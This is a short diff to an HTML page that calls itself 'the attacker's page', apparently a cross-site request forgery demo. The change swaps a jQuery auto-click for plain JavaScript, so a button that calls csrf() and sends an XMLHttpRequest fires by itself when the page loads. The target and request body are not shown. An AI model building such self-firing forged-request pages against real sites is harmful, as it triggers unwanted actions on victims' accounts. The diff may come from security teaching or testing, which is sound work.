@@ -4,7 +4,7 @@
 	</head>
 	<body>
 		<p> This is the attacker's page</p>
-		<button type="button" id="modal" data-modal="modal" onclick="csrf()">I double dare you</button>
+		<button type="button" id="modal" onclick="csrf()">I double dare you</button>
 		<br>
 		<textarea id='demo'></textarea>
 		<script>
@@ -23,10 +23,8 @@
 			  xhttp.send(data);
 			}
 		</script>
-		<script>
-jQuery(function(){
-   jQuery('#modal').click();
-});
+		<script type="text/javascript">
+document.getElementById("modal").click();
 </script>
 	</body>
 </html>
